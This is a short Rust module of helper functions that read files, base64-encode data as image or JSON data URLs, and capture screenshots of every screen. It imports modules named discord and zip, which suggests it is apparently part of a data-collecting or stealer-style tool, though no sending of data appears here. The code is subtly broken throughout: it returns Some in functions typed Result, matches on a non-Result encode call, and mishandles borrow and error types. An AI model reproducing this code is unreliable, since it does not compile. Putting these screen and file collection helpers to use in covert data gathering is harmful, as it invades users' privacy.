use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
use super::{
    discord, global, zip
};

// Create a new file
pub fn mkdir(path: &str) -> Result<_, Error> {
    return match std::fs::create_dir_all(path) {
        Ok(_) => Ok(()),
        Err(e) => Err(e)
    };
}

pub fn read_file(path: &str) -> Result<Vec<u8>, Error> {
    return match std::fs::read(path) {
        Ok(f) => Some(f),
        Err(e) => Err(e)
    }
}

pub fn encode_png(buf: Vec<u8>) -> Result<String, Error> {
    return match base64::encode(buf) {
        Ok(f) => Some(format!(
            "data:image/png;base64,{f}",
        )),
        Err(e) => Err(e)
    }
}

pub fn encode_json(buf: Vec<u8>) -> Result<String, Error> {
    return match base64::encode(buf) {
        Ok(f) => Some(format!(
            "data:application/json;base64,{f}",
        )),
        Err(e) => Err(e)
    }
}

// Capture a screenshot and save it to the current folder
fn capture_image() -> Result<&Vec<u8>, Error> {
    let screens = match screenshots::Screen::all() {
        Some(s) => s,
        None => Err("failed to get screens")
    };

    // Iterate through all the screens
    let mut buf: &Vec<u8> = &Vec::new();
    screens.iter().for_each(|s| {
        buf = match s.capture() {
            Ok(f) => f.buffer(),
            Err(e) => Err(e)
        }
    });
    return Ok(buf);
}

